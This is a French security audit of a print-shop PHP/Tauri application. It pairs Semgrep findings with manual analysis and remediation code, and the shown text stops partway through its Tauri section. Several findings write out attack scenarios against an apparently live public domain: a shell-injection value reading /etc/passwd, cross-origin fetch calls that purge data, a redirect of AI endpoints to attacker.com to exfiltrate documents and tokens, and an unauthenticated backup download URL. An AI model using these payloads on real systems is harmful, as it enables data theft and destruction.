# Rapport d'Audit de Sécurité — Duplicator (Tauri + PHP/Caddy)

## Contexte

Application de gestion d'impression en librairie/photo. Backend PHP via Caddy reverse proxy, base SQLite.

**Architecture de déploiement :**
- **Backend PHP** exposé sur **Internet public** via `https://dupli.zvz.fr` (Caddy :8000 → PHP :8001)
- **Client admin** : Tauri 2.x (pas Electron malgré le nom du repo) sur le poste de l'opérateur au comptoir
- **Clients finaux** : navigateur web depuis Internet (pas de login individuel — sessions créées par contact au comptoir)
- **Un seul admin** : l'opérateur qui gère le comptoir
- **Library** : contenu premium pour clients abonnés, protégé par un mot de passe partagé

**Modèle de menaces :**
Le serveur est accessible depuis **n'importe quel navigateur sur Internet**. Les utilisateurs finaux n'ont pas de compte — ils interagissent via des sessions créées par l'admin. La bibliothèque est protégée par un mot de passe commun aux abonnés. Le CORS `*` actuel permet à **n'importe quel site web** d'envoyer des requêtes vers le backend.

**Sources croisées :** 562 findings Semgrep + analyse manuelle du code source (`repomix-output.md`).

**Date :** 25 juillet 2026

---

## Table des matières

1. [Résumé exécutif](#résumé-exécutif)
2. [Architecture d'authentification — faille systémique](#architecture-dauthentification--faille-systémique)
3. [Findings Critiques (P0)](#findings-critiques-p0)
4. [Findings Haute priorité (P1)](#findings-haute-priorité-p1)
5. [Findings Moyens (P2)](#findings-moyens-p2)
6. [Findings confirmés par Semgrep (P3)](#findings-confirmés-par-semgrep-p3)
7. [Race conditions et TOCTOU](#race-conditions-et-toctou)
8. [Failles de logique métier](#failles-de-logique-métière)
9. [Sécurité Tauri / IPC / Caddy](#sécurité-tauri--ipc--caddy)
10. [Fausse positives Semgrep](#fausses-positives-semgrep)
11. [Recommandations architecturales](#recommandations-architecturales)
12. [Matrice de remédiation](#matrice-de-rémédiation)

---

## Résumé exécutif

**Score de risque global : CRITIQUE**

Le serveur PHP est exposé sur **Internet public** (`https://dupli.zvz.fr`). Le CORS `*` combiné à l'absence d'auth sur les endpoints destructeurs permet à **n'importe quel site web** d'envoyer des requêtes silencieusement vers le backend — destruction de données, exfiltration de la BDD, redirection des endpoints IA.

**Vecteur d'attaque principal :** Drive-by via CORS `*` — la victime n'a rien fait de mal, il suffit qu'elle ouvre un site malveillant.

Le croisement Semgrep + audit manuel a révélé :
- **7 vulnérabilités CRITIQUES** (RCE, SSRF, data destruction — toutes exposées sur Internet)
- **12 HAUTES** (IDOR, CSRF, info disclosure)
- **10 MOYENNES** (race conditions, config insecure)
- **460+ findings Semgrep** (injections, XSS, supply chain)

**Impact business :** Vol de base de données complète (backup accessible sans auth depuis Internet), manipulation des facturations d'impression, exfiltration des documents via IA redirectée, destruction de l'historique.

### Statistiques Semgrep

| Sévérité | Nombre | % |
|----------|--------|---|
| CRITICAL | 7 | 1.2% |
| ERROR | 101 | 18.0% |
| WARNING | 442 | 78.6% |
| INFO | 12 | 2.1% |
| **Total** | **562** | **100%** |

**Répartition par technologie :**

| Technologie | Findings |
|-------------|----------|
| PHP | 387 |
| JavaScript | 86 |
| GitHub Actions | 79 |
| Node.js | 54 |
| Laravel | 7 |

**25 règles uniques** identifiées, les plus critiques étant :

| Rule ID | Sévérité | Count | Impact |
|---------|----------|-------|--------|
| `tainted-command-injection` | CRITICAL | 7 | RCE |
| `tainted-exec` | ERROR | 6 | Command injection |
| `run-shell-injection` | ERROR | 3 | CI injection |
| `tainted-sql-string` | ERROR | 5 | SQL injection |
| `path-traversal.tainted-path` | ERROR | 1 | File read |
| `deserialization.extract-user-data` | ERROR | 1 | Data leak |
| `exec-use` | ERROR | 58 | Command exec |
| `detect-child-process` | ERROR | 18 | JS exec |
| `tainted-filename` | WARNING | 117 | File overwrite |
| `unlink-use` | WARNING | 92 | File deletion |
| `unsafe-echo-tag` | WARNING | 77 | XSS |
| `path-join-resolve-traversal` | WARNING | 53 | Path traversal |
| `github-actions-mutable-action-tag` | WARNING | 76 | Supply chain |

---

## Architecture d'authentification — faille systémique

### Le problème fondamental

Le routeur `index.php` définit une whitelist `$page_secure` mais **n'applique pas d'auth middleware pour les appels API**. Chaque fichier `app/api/*.php` doit gérer sa propre auth — et **la majorité ne le fait pas**.

Étant donné que le serveur est exposé sur Internet (`dupli.zvz.fr`), ces endpoints sans auth sont accessibles depuis **n'importe quel navigateur dans le monde**. Le CORS `*` aggrave le problème en permettant aux sites web malveillants d'envoyer des requêtes silencieusement.

```
Attaquant (site malveillant) → POST https://dupli.zvz.fr/?save_ai_settings
  → save_ai_settings.php (aucun check) → redirection IA vers serveur attaquant

Attaquant (navigateur) → GET https://dupli.zvz.fr/api/download_backup.php?file=duplinew.sqlite
  → download_backup.php (accessible hors routeur) → téléchargement complet de la BDD

Attaquant (navigateur) → GET https://dupli.zvz.fr/?secure_purge
  → secure_purge.php (aucun check) → destruction de l'historique
```

### Modèle d'authentification existant

- `$_SESSION['user']` = admin (défini au login par mot de passe, `index.php:36927`)
- `$_SESSION['bib_authenticated']` = accès library (mot de passe partagé pour les abonnés)
- CSRF tokens : `generate_csrf_token()` et `verify_csrf_token()` **définis mais jamais appelés**
- Aucun middleware centralisé, aucune session_start() dans les fichiers API

### Quoi protéger — modèle de menaces corrigé

L'application n'est **pas** un SaaS multi-utilisateurs. C'est un outil de comptoir avec :
- **1 admin** (l'opérateur) — doit pouvoir tout faire
- **Des clients** (pas de login) — ont besoin d'accéder en lecture aux sessions/jobs/PDF
- **Des abonnés library** — accès au contenu premium avec mot de passe

| Opération | Auth ? | Raison |
|-----------|--------|--------|
| Lister les sessions en cours | Non | Lecture seule, le client doit voir sa session |
| Créer une session (au comptoir) | Non | L'admin le fait physiquement |
| Voir les impressions en attente | Non | Lecture seule |
| Télécharger un PDF déjà traité | Non | Lecture seule |
| **Purger l'historique** | **Oui admin** | Destruction de données — catastrophe |
| **Supprimer un job** | **Oui admin** | Destruction de données |
| **Modifier les settings IA** | **Oui admin** | Redirige le trafic vers un serveur attaquant |
| **Télécharger le backup .sqlite** | **Oui admin** | Extrait toute la BDD (mdps, sessions, jobs) |
| **Fermer TOUTES les sessions** | **Oui admin** | Destructif — disruption de service |
| **Réassigner des jobs** | **Oui admin** | Manipulation de facturation |
| **Accès library** | **Oui mdp library** | Contenu premium abonnés |

### Résumé de l'architecture

```
Internet public → https://dupli.zvz.fr (Caddy :8000)
                        ↓
                   Caddyfile (reverse proxy + CORS)
                        ↓
                   PHP-FPM :4001
                        ↓
app/
├── public/index.php       # Routeur monolithique, 60+ dispatch via $_GET
├── public/api/            # Endpoints accessibles hors routeur (⚠ download_backup.php)
├── api/                   # 50+ fichiers PHP endpoints
├── controler/functions/   # Logique backend (database, auth, paths, etc.)
├── models/                # Classes métier (imposition, settings, etc.)
├── view/                  # Templates PHP

src-tauri/                 # Shell Rust Tauri 2.x (client admin local)
├── src/main.rs            # Entrée, 18+ commandes Tauri
├── tauri-bridge.js        # Injecté dans webview, 25+ méthodes window.electronAPI
├── server_manager.rs      # Gestion sidecars Caddy + PHP
```

---

## Findings Critiques (P0)

### C1. Exécution de commandes arbitraires (RCE)

**Semgrep :** `tainted-command-injection` × 7  
**Fichiers :**
- `app/api/convert-pcl-to-png.php:402`
- `app/api/convert-pcl-to-png.php:438`
- `app/api/convert-xps-to-png.php:305`
- `app/api/install_local_ai.php:41`
- `app/api/install_local_ai.php:57`
- `app/api/upload_bibliotheque.php`

Input utilisateur injecté directement dans `exec()`/`shell_exec()`. **RCE complète** possible via n'importe quel champ de formulaire ou paramètre GET.

**Scénario d'attaque :**
```
POST /?convert-pcl-to-png
file=;cat /etc/passwd > /tmp/leaked;
```

**Correctif :**
```php
// AVANT (vulnérable)
$cmd = "convert " . $input_file . " " . $output_file;
exec($cmd);

// APRÈS (sécurisé)
$cmd = sprintf('convert %s %s',
    escapeshellarg($input_file),
    escapeshellarg($output_file)
);
exec($cmd);
```

**Alternative recommandée :** Utiliser `proc_open()` avec un array d'arguments au lieu de construire une chaîne de commande.

---

### C2. Purge non authentifiée de la base de données

**Fichier :** `app/api/secure_purge.php`  
**Severity :** CRITICAL  
**Exposé sur :** `https://dupli.zvz.fr/?secure_purge` (Internet public)

Aucune authentification. Supprime toutes les lignes de `print_jobs` et `recorded_print_jobs` plus anciennes que 7 jours, plus supprime récursivement les répertoires de thumbnails. Inclut `Access-Control-Allow-Origin: *`.

**Scénario d'attaque :**
```
# Depuis n'importe quel navigateur :
GET https://dupli.zvz.fr/?secure_purge
# → Destruction de tout l'historique d'impression

# Depuis un site malveillant (via CORS *) :
fetch('https://dupli.zvz.fr/?secure_purge')
# → Destruction silencieuse pendant que la victime navigue
```

**Correctif :**
```php
<?php
session_start();
if (!isset($_SESSION['user']) || $_SESSION['user'] !== '1') {
    http_response_code(403);
    exit(json_encode(['error' => 'Forbidden']));
}

// Supprimer aussi le CORS permissif
header_remove('Access-Control-Allow-Origin');
```

---

### C3. Suppression de jobs sans auth + IDOR

**Fichier :** `app/api/delete_session_job.php`  
**Severity :** CRITICAL  
**Exposé sur :** `https://dupli.zvz.fr/?delete_session_job` (Internet public)

Accepte `$_GET['id']` et `$_GET['type']`, exécute `DELETE FROM $table WHERE id = ?` sans aucune vérification d'authentification ni de propriété.

**Scénario d'attaque :**
```
# Itération des IDs pour détruire tous les enregistrements :
GET https://dupli.zvz.fr/?delete_session_job&id=1&type=photocop
GET https://dupli.zvz.fr/?delete_session_job&id=2&type=photocop
GET https://dupli.zvz.fr/?delete_session_job&id=3&type=photocop
...
```

**Correctif :**
```php
session_start();
if (!isset($_SESSION['user'])) { http_response_code(403); exit; }

// Ownership check
$stmt = $db->prepare("
    SELECT j.id FROM $table j
    JOIN sessions s ON j.session_id = s.id
    WHERE j.id = ? AND s.user_id = ?
");
$stmt->execute([$_GET['id'], $_SESSION['user']]);
if (!$stmt->fetch()) { http_response_code(404); exit; }
```

---

### C4. CRUD sessions complète sans auth

**Fichier :** `app/api/sessions.php`  
**Severity :** CRITICAL  
**Exposé sur :** `https://dupli.zvz.fr/?sessions` (Internet public)

Aucune authentification sur **toutes** les opérations : lister, créer, fermer, fermer toutes, réassigner des jobs. Depuis Internet, n'importe qui peut manipuler les sessions de facturation.

**Scénarios d'attaque :**
```
# Dump de toutes les sessions avec noms et montants :
GET https://dupli.zvz.fr/?sessions&action=list

# Fermeture de TOUTES les sessions (disruption de service) :
GET https://dupli.zvz.fr/?sessions&action=close_all

# Vol de jobs entre sessions (manipulation de facturation) :
POST https://dupli.zvz.fr/?sessions&action=reassign_job
job_table=photocop&job_id=1&session_id=2
```

**Correctif :** Implémenter un middleware d'auth centralisé + ownership check sur chaque opération.

---

### C5. Backup SQLite téléchargeable sans auth

**Fichier :** `app/public/api/download_backup.php`  
**Severity :** CRITICAL  
**Exposé sur :** `https://dupli.zvz.fr/api/download_backup.php` (Internet public, hors routeur)

Situé dans `public/api/`, accessible directement sans passer par le routeur `index.php`. Aucune auth. Accepte `$_GET['file']`, valide l'extension `.sqlite`, puis sert n'importe quel fichier `.sqlite` depuis plusieurs répertoires dont `sys_get_temp_dir() . '/duplicator_backups/'`.

**Contenu de la base :** Hashes de mot de passe admin, mdp library en clair, toutes les sessions, tous les jobs d'impression.

**Scénario d'attaque :**
```
# Téléchargement complet de la base de données depuis Internet :
GET https://dupli.zvz.fr/api/download_backup.php?file=duplinew.sqlite
# → L'attaquant obtient :
#   - Hash bcrypt du mot de passe admin
#   - Mot de passe library EN CLAIR
#   - Toutes les sessions et facturations
#   - Historique complet des impressions
```

**Correctif :**
1. Déplacer le fichier hors du document root public
2. Ajouter une auth admin stricte
3. Restreindre aux fichiers de backup créés par l'application
4. Ajouter un token temporaire dans l'URL (validité 15 min)

```php
<?php
session_start();
if (!isset($_SESSION['admin'])) { http_response_code(403); exit; }

$token = $_GET['token'] ?? '';
if (!hash_equals($_SESSION['backup_token'], hash('sha256', $token))) {
    http_response_code(403); exit;
}
if (time() - $_SESSION['backup_token_time'] > 900) {
    http_response_code(410); exit; // expired
}
```

---

### C6. SSRF via endpoints IA sans auth

**Fichier :** `app/api/save_ai_settings.php`  
**Severity :** CRITICAL  
**Exposé sur :** `https://dupli.zvz.fr/?save_ai_settings` (Internet public)

Le commentaire dit "Admin seulement" mais il y a **zéro code d'authentification**. Accepte POST pour modifier `ai_llm_url`, `ai_embedding_url`, `ai_reranker_url`, `ai_token`, `bibliotheque_password`, `whatfontis_api_key` et d'autres paramètres.

**Scénario d'attaque :**
```
# Depuis un site malveillant (via CORS *) — la victime n'a rien fait :
fetch('https://dupli.zvz.fr/?save_ai_settings', {
    method: 'POST',
    body: 'ai_llm_url=http://attacker.com/v1/chat/completions&ai_embedding_url=http://attacker.com/api/embeddings'
})

# Ensuite, chaque requête chat_rag.php envoie :
#   - Les documents de la library
#   - Le token d'auth IA
#   → vers le serveur de l'attaquant
```

**Correctif :**
```php
<?php
session_start();
if (!isset($_SESSION['admin'])) { http_response_code(403); exit; }

// Allowlist d'URLs autorisées pour les endpoints IA
$allowedHosts = ['localhost', '127.0.0.1', 'ollama.local'];
$parsedUrl = parse_url($_POST['ai_llm_url'] ?? '');
if (!in_array($parsedUrl['host'] ?? '', $allowedHosts)) {
    http_response_code(400);
    exit(json_encode(['error' => 'URL non autorisée']));
}
```

---

### C7. Injection de commandes — install_local_ai.php

**Fichier :** `app/api/install_local_ai.php`  
**Semgrep :** `tainted-command-injection`  
**Severity :** CRITICAL

Accepte `$_POST['target_dir']` injecté dans `exec()` avec seulement un garde `isElectron()`. En mode Electron, un attaquant peut spécifier n'importe quel répertoire.

**Correctif :** Valider le répertoire contre un allowlist de chemins autorisés + utiliser `escapeshellarg()` sur tous les arguments.

---

## Findings Haute priorité (P1)

### H1. CSRF jamais implémenté

**Fichier :** `app/controler/functions/init.php:17742-17767`  
**Severity :** HIGH

Les fonctions `generate_csrf_token()` et `verify_csrf_token()` sont définies mais **jamais appelées** dans aucun endpoint. Toute opération POST (suppression, création, modification) est exploitable cross-origin.

**Correctif :**
```php
// Dans chaque formulaire
<input type="hidden" name="csrf_token" value="<?php echo generate_csrf_token(); ?>">

// Dans chaque handler POST
if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    exit(json_encode(['error' => 'CSRF token invalide']));
}
```

---

### H2. Mot de passe library en clair dans la base

**Fichiers :**
- `app/models/bibliotheque.php:213007` — comparaison `===`
- `app/api/save_ai_settings.php:10112` — stockage en clair
- `app/models/bibliotheque.php:203483` — rendu HTML en clair

**Severity :** HIGH

Le mot de passe de la library est stocké en clair dans la table `site_settings` et comparé directement avec `===`. Si la base est compromise (voir C5), le mdp est immédiatement récupérable.

**Correctif :**
```php
// Stockage
$hashed = password_hash($newPassword, PASSWORD_BCRYPT);
$settings->set('bibliotheque_password', $hashed);

// Vérification
$storedHash = $settingsManager->get('bibliotheque_password', '');
if (!empty($storedHash) && !password_verify($_POST['bib_pass'], $storedHash)) {
    // Mot de passe incorrect
}
```

---

### H3. SQL Injection via nom de table

**Fichier :** `app/api/sessions.php:11319`  
**Severity :** HIGH (fragile)

`reassignJob()` exécute `UPDATE $job_table SET session_id = ?` où `$job_table` provient de l'entrée utilisateur. Une vérification `in_array` (ligne 11301) restreint à `['photocop', 'dupli', 'print_jobs']` mais le nom de table reste interpolé directement dans le SQL.

**Correctif :** Valider le nom de table avec une regex stricte et documenter le pattern pour les futurs développeurs :
```php
if (!preg_match('/^[a-z_]+$/', $job_table)) {
    http_response_code(400);
    exit('Invalid table name');
}
// Ou mieux : mapper les noms vers des constantes
$allowedTables = [
    'photocop' => 'photocop',
    'dupli' => 'dupli',
    'print_jobs' => 'print_jobs',
];
if (!isset($allowedTables[$job_table])) { exit(400); }
```

---

### H4. Path traversal TOCTOU — readfile() utilise le mauvais variable

**Fichiers :**
- `app/api/download_pdf.php:8047`
- `app/api/view_pdf.php`
- `download_merged` (line 188203)
- `download_resized` (line 188231)

**Severity :** HIGH

Le code vérifie `realpath($filepath)` pour empêcher les traversées de répertoire, puis utilise la variable `$filepath` (non validée) pour `readfile()` au lieu de `$real_filepath` (validée). Un attaquant avec accès au système de fichiers temporaire peut déplacer un symlink entre la vérification et l'utilisation.

**Correctif :**
```php
$real_filepath = realpath($filepath);
if (!$real_filepath || strpos($real_filepath, $real_tmp_dir) !== 0) {
    die('Fichier non trouvé ou expiré');
}
// TOUJOURS utiliser $real_filepath pour les opérations suivantes
readfile($real_filepath); // PAS $filepath
```

---

### H5. Spool TOCTOU — file_exists() puis fopen() sur spool Windows actif

**Fichiers :**
- `app/api/convert-emf-to-png.php:6578`
- `app/api/convert-pcl-to-png.php:6987`
- `app/api/convert-xps-to-png.php:7573`

**Severity :** HIGH

Le Windows Print Spooler écrit et supprime activement les fichiers SPL. Entre `file_exists()` et `fopen()`, le spooler peut supprimer le fichier ou le remplacer par un autre job.

**Correctif :** Copier le fichier SPL dans un fichier temporaire atomiquement (`copy()` ou `rename()`) avant de le traiter. Le converter XPS a déjà une copie partielle — l'étendre à EMF et PCL.

---

### H6. Double démarrage sidecars sans garde atomique

**Fichier :** `src-tauri/src/server_manager.rs:263501`  
**Severity :** HIGH

`start_servers()` ne vérifie pas si les serveurs sont déjà en cours d'exécution. Un double appel (clics rapides, event replay) peut :
1. Spawn un deuxième Caddy sur le même port → conflit ou zombie
2. Overwriter le handle du premier process → process orphelin
3. Créer un état split-brain où deux PHP servent des requêtes différentes

**Correctif :**
```rust
#[tauri::command]
pub async fn start_servers(app: AppHandle) -> Result<(), String> {
    let state = app.state::<AppState>();
    let mut running = state.is_running.lock().unwrap();
    if *running {
        return Err("Servers already running".into());
    }
    launch_all_sidecars(&app).await?;
    *running = true;
    Ok(())
}
```

---

### H7. Rate limit manquant sur auth library

**Fichier :** `app/controler/functions/bibliotheque.php:14577`  
**Severity :** HIGH

Aucune limite de tentatives, aucun lockout, aucun CAPTCHA, aucun délai entre les tentatives. Le mdp est stocké en clair (voir H2), rendant le brute-force trivial.

**Correctif :**
```php
session_start();
$maxAttempts = 5;
$key = 'bib_auth_attempts_' . md5($_SERVER['REMOTE_ADDR']);
$attempts = (int)($_SESSION[$key] ?? 0);

if ($attempts >= $maxAttempts) {
    $waitTime = pow(2, $attempts - $maxAttempts) * 30; // backoff exponentiel
    http_response_code(429);
    exit(json_encode(['error' => 'Trop de tentatives, réessayez dans ' . $waitTime . 's']));
}

if ($_POST['bib_pass'] !== $bib_password) {
    $_SESSION[$key] = $attempts + 1;
    exit(json_encode(['error' => 'Mot de passe incorrect']));
}
unset($_SESSION[$key]); // reset sur succès
```

---

### H8. Taux de remplissage client-supplié → impressions gratuites

**Fichier :** `app/api/save_auto_print.php:10198`  
**Severity :** HIGH

Le `fill_rate` est entièrement contrôlé par le client. Envoyer `fill_rate=0` rend le multiplicateur de coût couleur à 0, permettant des impressions quasi-gratuites.

**Correctif :** Calculer le `fill_rate` côté serveur ou le limiter à un plage réaliste :
```php
$fill_rate = floatval($input['fill_rate'] ?? 0.5);
$fill_rate = max(0.1, min(1.0, $fill_rate)); // Clamp entre 10% et 100%
```

---

### H9. Jobs d'impression sans auth — injection de metadata

**Fichier :** `app/api/print-notification.php`  
**Severity :** HIGH

Aucune authentification. Toute machine du réseau peut envoyer des notifications de job avec des métadonnées arbitraires (jobId, document, totalPages, printerName).

**Correctif :** Auth + validation des métadonnées côté serveur.

---

### H10. Purge de l'historique sans auth

**Fichier :** `app/api/check-print-jobs.php:6149`  
**Severity :** HIGH

POST `action=purge_all` sans auth détruit tout l'historique d'impression via `DELETE FROM print_jobs` + `DELETE FROM recorded_print_jobs` + `secure_delete()` sur les fichiers associés.

---

### H11. Affichage de $_SESSION en erreur

**Fichier :** `app/api/upload_aide_pdf.php:14190`  
**Severity :** HIGH

En cas d'échec d'auth, le code affiche : `echo json_encode(['debug' => $_SESSION])` — fuite complète de toutes les variables de session.

**Correctif :** Supprimer la ligne de debug ou la conditionner à une constante `DEBUG_MODE` strictement à false en production.

---

### H12. CORS `*` sur tous les endpoints sensibles

**Fichiers :** `Caddyfile` + multiples fichiers PHP (`check-print-jobs.php:5973`, `install_local_ai.php:9077`, `print-notification.php:9509`, `secure_purge.php:10882`, etc.)  
**Severity :** HIGH

`Access-Control-Allow-Origin: *` sur un serveur **exposé sur Internet** permet à **n'importe quel site web** d'envoyer des requêtes silencieusement vers le backend. C'est le catalyseur qui transforme les endpoints sans auth en failles exploitables drive-by.

**Scénario :**
```
Victime → ouvre https://site-malveillant.com
  → le JS du site envoie fetch('https://dupli.zvz.fr/?secure_purge')
  → CORS autorise la requête → le serveur obéit → données détruites
```

**Correctif :**
```
# Caddyfile — remplacer * par le domaine réel
header Access-Control-Allow-Origin "https://dupli.zvz.fr"

# Si Tauri a aussi besoin d'accès :
header Access-Control-Allow-Origin "https://dupli.zvz.fr, tauri://localhost"
```

**Important :** Les en-têtes CORS individuels dans les fichiers PHP doivent aussi être supprimés ou remplacés. CORS doit être géré **uniquement** au niveau Caddy.

---

## Findings Moyens (P2)

### M1. Session fixation

**Fichier :** `app/public/index.php:187930`  
**Severity :** MEDIUM

Pas de `session_regenerate_id()` après login. Un attaquant peut injecter un ID de session avant l'authentification.

**Correctif :**
```php
$_SESSION['user'] = '1';
session_regenerate_id(true); // Nouveau session ID après auth
```

---

### M2. Pas de session_destroy() au logout

**Fichier :** Global — aucune occurrence de `session_destroy()` dans le code PHP.  
**Severity :** MEDIUM

Le cookie de session n'est jamais invalidé côté serveur. Un ID de session volé reste valide indéfiniment.

**Correctif :**
```php
// Page logout
session_start();
$_SESSION = [];
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}
session_destroy();
```

---

### M3. Répertoires temp créés en 0777

**Fichiers :** `app/controler/functions/paths.php:20214`  
**Severity :** MEDIUM

```php
@mkdir($dir, 0777, true);
@chmod($dir, 0777);
```

Tout utilisateur local peut créer des symlinks dans ces répertoires, combiné au H4 pour une lecture de fichier arbitraire.

**Correctif :**
```php
@mkdir($dir, 0700, true);
// Supprimer le chmod 0777
```

---

### M4. Lock maintenance non atomique

**Fichier :** `app/api/run_background_maintenance.php:10010`  
**Severity :** MEDIUM

Vérifie `file_exists($lockFile)` puis écrit `file_put_contents()` sans verrou atomique. Deux requêtes concurrentes peuvent toutes deux lancer la maintenance.

**Correctif :**
```php
$fp = fopen($lockFile, 'w');
if (!flock($fp, LOCK_EX | LOCK_NB)) {
    echo json_encode(['status' => 'skipped']);
    exit;
}
fwrite($fp, time());
// Le verrou est libéré automatiquement à fclose()
```

---

### M5. Race condition création session

**Fichier :** `app/api/sessions.php:11180`  
**Severity :** MEDIUM

SELECT puis INSERT séparés — deux requêtes concurrentes peuvent créer des sessions en double.

**Correctif :** Transaction SQLite `BEGIN IMMEDIATE` + contrainte UNIQUE.

---

### M6. Background jobs JSON read-modify-write sans lock

**Fichiers :** `background_analyze_ink.php:4568`, `background_ocr.php`, `background_studio_ocr.php`, `background_studio_task.php`  
**Severity :** MEDIUM

Deux processus lisent le même JSON, le modifient, et écrivent — last writer wins, traitement potentiel en double.

**Correctif :** `flock()` sur le fichier JSON avant lecture.

---

### M7. Thumbnail Linux sans realpath() check

**Fichier :** `app/api/check-print-jobs.php:5952`  
**Severity :** MEDIUM

Utilise `basename()` mais pas `realpath()`. Un symlink dans `/tmp/dupli_thumbnails/` peut pointer vers un fichier arbitraire.

**Correctif :** Ajouter un `realpath()` check et un `Content-Type` dynamique via `finfo_file()`.

---

### M8. fix_settings.php — rewrite de code applicatif

**Fichier :** `app/api/fix_settings.php`  
**Severity :** MEDIUM

Relit `studio_process.php`, applique un regex, et réécrit le fichier. Sans auth. Peut corrompre le code applicatif.

**Correctif :** Supprimer ce fichier du déploiement production.

---

### M9. Actions GitHub non pinées

**Fichiers :** `.github/workflows/*.yml` (×76 occurrences)  
**Severity :** MEDIUM

Tags mutables (`@v4`, `@v3`) au lieu de SHAs pinés — risque d'attaque supply chain.

**Correctif :** Piner chaque action avec son SHA de commit :
```yaml
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

---

### M10. Clé privée PGP dans mime.xml

**Fichier :** `bin/win-x64/mime.xml:41`  
**Severity :** MEDIUM

Bloc de clé privée PGP détecté dans un fichier de configuration.

**Correctif :** Vérifier s'il s'agit d'un faux positif (exemple/documentation) ou supprimer/révoquer la clé.

---

## Findings confirmés par Semgrep (P3)

### S1. XSS via echo non échappé (77 occurrences)

**Rule :** `php.lang.security.taint-unsafe-echo-tag`

Templates PHP qui affichent des variables utilisateur sans `htmlspecialchars()`. Impact : XSS stored/reflected.

**Correctif :** `echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');` sur toutes les sorties.

---

### S2. unlink() avec input utilisateur (92 occurrences)

**Rule :** `php.lang.security.unlink-use`

Suppression de fichiers dont le nom provient de l'entrée utilisateur. Risque de suppression arbitraire.

**Correctif :** Valider le chemin avec `realpath()` + vérification du répertoire parent.

---

### S3. exec() sans escapeshellarg (58 occurrences)

**Rule :** `php.lang.security.exec-use`

Appels `exec()`/`shell_exec()`/`passthru()` sans échappement des arguments.

**Correctif :** Systématiquement utiliser `escapeshellarg()` ou `escapeshellcmd()`.

---

### S4. child_process JS avec args tainted (18 occurrences)

**Rule :** `javascript.lang.security.detect-child-process`

Scripts Node.js qui exécutent des commandes shell avec des arguments non validés.

**Correctif :** Valider les arguments et utiliser `execFile()` au lieu de `exec()`.

---

### S5. ReDoS potentiel (3 occurrences)

**Rule :** `javascript.lang.security.audit.detect-non-literal-regexp`

`RegExp()` avec un argument non-literal dans `viewer.js`. Peut causer un déni de service via pattern ReDoS.

**Correctif :** Utiliser des regex literals ou valider le pattern.

---

### S6. Injection shell GitHub Actions (3 occurrences)

**Rule :** `yaml.github-actions.security.run-shell-injection`

Utilisation de `${{ }}` dans les blocs `run:` des workflows GitHub Actions.

**Correctif :** Passer les valeurs via des variables d'environnement :
```yaml
# AVANT
run: echo "${{ github.event.issue.title }}"
# APRÈS
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"
```

---

## Race conditions et TOCTOU

### RC1. Spool file TOCTOU — check-then-read

**Fichiers :** `convert-emf-to-png.php:6578`, `convert-pcl-to-png.php:6987`, `convert-xps-to-png.php:7573`

Le Windows Print Spooler modifie activement les fichiers SPL entre `file_exists()` et `fopen()`. Le converter XPS a une copie partielle (shadow copy) — étendre ce pattern à EMF et PCL.

---

### RC2. SpoolManager deleteSpoolFiles — race find-then-delete

**Fichier :** `app/controler/functions/SpoolManager.php:18772`

Entre `findSpoolFile()` retournant un chemin et `secure_delete()` opérant dessus, le spooler peut avoir supprimé ou renommé le fichier, causant la suppression du mauvais fichier.

**Correctif :** Ouvrir le fichier avec `flock(LOCK_EX)` avant suppression, ou utiliser `unlink()` atomique.

---

### RC3. secure_delete() TOCTOU — shred-then-delete

**Fichier :** `app/controler/functions/secure_delete.php:18686`

Pendant l'opération de shred (qui peut prendre des secondes), le fichier peut être remplacé via un symlink. Le `unlink()` final opère sur le chemin original, pas sur le fichier shredé.

**Correctif :** Utiliser `rename()` vers un fichier temporaire avant le shred, ou ouvrir le fichier avec `O_NOFOLLOW`.

---

### RC4. Temp directories 0777 + symlink attack

**Fichiers :** `app/controler/functions/paths.php:20208`

`/tmp/duplicator` créé en 0777 permet à tout utilisateur local de créer des symlinks. Combiné au H4 (`readfile($filepath)` au lieu de `readfile($real_filepath)`), c'est une primitive de lecture de fichier arbitraire.

**Correctif :** `mkdir($dir, 0700)` + toujours utiliser le chemin `realpath()` validé.

---

## Failles de logique métier

### LM1. Manipulation des facturations d'impression

**Combinaison :** H8 (fill_rate=0) + H9 (print-notification sans auth) + H10 (purge sans auth)

Un attaquant peut :
1. Créer des jobs fantômes avec coût zéro (fill_rate=0)
2. Les ajouter à la session d'une autre personne (reassign_job sans auth)
3. Purger les preuves (purge_all sans auth)

---

### LM2. Exfiltration via RAG/IA

**Combinaison :** C6 (save_ai_settings sans auth) + chat_rag.php

1. Rediriger l'endpoint IA vers un serveur attaquant
2. Chaque requête utilisateur envoie les documents de la library + le token d'auth
3. L'attaquant reçoit l'intégralité des données de la library

---

### LM3. Brute-force library password

**Combinaison :** H7 (pas de rate limit) + H2 (mdp en clair)

Le mot de passe de la library peut être brute-forcé sans contrainte. Une fois trouvé, il donne accès à tous les endpoints de library (upload, chat RAG, recherche).

---

### LM4. Manipulation du système d'auto-update

**Fichier :** `check-feed.js` + updater configuration

Le système d'auto-update récupère `updater/latest.json` depuis GitHub. Si la clé minisign n'est pas vérifiée de manière stricte, ou si le flux est MITM (le site utilise HTTPS mais la vérification est faible), un attaquant peut injecter une mise à jour malveillante.

**Recommandation :** Vérifier que la signature minisign est validée avant toute installation, et que le URL d'update utilise HTTPS avec certificate pinning.

---

## Sécurité Tauri / IPC / Caddy

### T1. Capabilities Tauri sur-permissives

**Fichier :** `src-tauri/capabilities/default.json`

| Capability | Risque |
|------------|--------|
| `shell:allow-execute` avec `args: true` | Exécution de commandes arbitraires si le webview est compromis |
| `fs:allow-write` | Écriture filesystem sans restriction |
| `allow-all-commands` | Toutes les commandes Tauri disponibles sans filtrage |
| `http://localhost:*` | Requêtes vers n'importe quel service local |

**Correctif :**
```json
{
  "permissions": [
    {
      "identifier": "shell:allow-execute",
      "allow": [
        { "name": "caddy", "args": ["run", { "validator": "^$" }] },
        { "name": "dupli-php", "args": [{ "validator": "^-c .+$" }] }
      ]
    }
  ]
}
```

Supprimer `allow-all-commands`, restreindre `fs:allow-write` à des chemins spécifiques.

---

### T2. IPC bridge — window.electronAPI

**Fichier :** `src-tauri/tauri-bridge.js`

Expose 25+ méthodes au webview. Si une faille XSS existe dans le webview, l'attaquant peut invoquer toutes ces méthodes.

